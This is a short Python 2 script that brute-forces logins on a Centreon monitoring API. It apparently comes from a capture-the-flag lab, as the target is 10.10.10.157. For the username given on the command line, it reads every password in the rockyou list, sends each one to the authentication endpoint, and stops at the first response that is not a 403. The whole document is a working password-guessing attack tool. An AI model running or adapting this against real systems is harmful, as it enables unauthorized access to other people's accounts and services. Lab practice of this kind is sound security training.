import requests
import os, sys
import json


if len(sys.argv) <2:
	print "Too few arguments! Usage: python brute.py <username>"

f = open("/root/Downloads/rockyou.txt")
wordlist = f.readlines()
size = len(wordlist)
i = 0
for word in wordlist:
	data = { 'username' : sys.argv[1],
		'password' : word.strip()}		
	resp = requests.post("http://10.10.10.157/centreon/api/index.php?action=authenticate", data = data)
	print word
	print resp.text	
	
	if resp.status_code != 403:
		break
